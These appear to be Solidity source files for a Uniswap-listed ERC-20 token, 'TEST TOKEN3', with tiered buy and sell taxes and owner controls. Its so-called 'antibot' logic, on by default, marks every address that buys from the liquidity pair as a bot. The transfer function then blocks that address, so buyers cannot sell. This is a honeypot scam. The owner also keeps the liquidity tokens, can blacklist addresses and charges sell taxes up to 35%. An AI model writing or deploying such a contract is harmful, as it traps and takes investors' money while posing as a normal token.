pragma solidity ^0.8.7;

import "./TradableErc20.sol";

contract TEST_TOKEN is TradableErc20 {
    address _owner;

    constructor() TradableErc20("TEST TOKEN3", "TEST3") {
        _owner = msg.sender;
    }

    function getByuTax(uint256 amount)
        internal
        pure
        override
        returns (uint256)
    {
        return amount / 10; // 10% tax
    }

    function getSellTax(uint256 amount)
        internal
        view
        override
        returns (uint256)
    {
        uint256 value = _balances[uniswapV2Pair];
        //uint256 value = _totalSupply;
        uint256 vMin = value / 100; // min additive tax amount
        if (amount <= vMin) return amount / 10; // 10% constant tax
        uint256 vMax = (value * 10) / 100; // max additive tax amount
        if (amount > vMax) return (amount * 35) / 100; // 35% tax

        // 10% constant tax and additive tax, that in intervat 0-25%
        return
            amount /
            10 +
            (((amount - vMin) * 25 * amount) / (vMax - vMin)) /
            100;
    }

    function isOwner(address account) internal view override returns (bool) {
        return account == _owner;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _owner = newOwner;
    }
}

pragma solidity ^0.8.7;

//import "hardhat/console.sol";
import "./ERC20.sol";
import "./IUniswapV2Router02.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract TradableErc20 is ERC20 {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool public tradingEnable;
    mapping(address => bool) public isBot;
    mapping(address => bool) _isExcludedFromFee;
    bool _autoBanBots = true;
    bool _inSwap;
    uint256 public maxBuy = 1e28; // 1% max by default

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {
        _isExcludedFromFee[address(0)] = true;
    }

    receive() external payable {}

    function makeLiquidity() public onlyOwner {
        require(uniswapV2Pair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _balances[address(this)] = _totalSupply;
        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalSupply,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapV2Pair = pair;
        tradingEnable = true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(!isBot[from] && !isBot[to]);

        // buy
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            require(tradingEnable);
            if (!_autoBanBots) require(_balances[to] + amount <= maxBuy);
            // antibot
            if (_autoBanBots) isBot[to] = true;
            amount = _getFeeBuy(amount);
        }

        // sell
        if (!_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair) {
            amount = _getFeeSell(amount, from);
        }

        // transfer
        super._transfer(from, to, amount);
    }

    function _getFeeBuy(uint256 amount) private returns (uint256) {
        uint256 fee = getByuTax(amount);
        amount -= fee;
        _totalSupply -= fee;
        emit Transfer(address(this), address(0), fee);
        return amount;
    }

    function _getFeeSell(uint256 amount, address account) private returns (uint256) {
        uint256 fee = getSellTax(amount);
        amount -= fee;
        _balances[account] -= fee;        
        _totalSupply -= fee;
        emit Transfer(account, address(0), fee);
        return amount;
    }


    function setMaxBuy(uint256 percent) external onlyOwner {
        _setMaxBuy(percent);
    }

    function _setMaxBuy(uint256 percent) internal {
        maxBuy = (percent * _totalSupply) / 100;
    }


    function setBots(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isBot[accounts[i]] = value;
        }
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setTradingEnable(bool value, bool autoBanBotsValue)
        external
        onlyOwner
    {
        tradingEnable = value;
        _autoBanBots = autoBanBotsValue;
    }

    function setAutoBanBots(bool value) external onlyOwner {
        _autoBanBots = value;
    }

    function getByuTax(uint256 amount) internal virtual returns (uint256);
    function getSellTax(uint256 amount) internal virtual returns (uint256);
    function isOwner(address account) internal virtual returns (bool);
}

pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is IERC20 {
    uint256 internal _totalSupply = 1e30;
    string _name;
    string _symbol;
    uint8 constant _decimals = 18;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(from, to, amount);

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount);
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0));

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount);
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.7;

interface IUniswapV2Router02 {
    //function swapExactTokensForETHSupportingFeeOnTransferTokens(
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}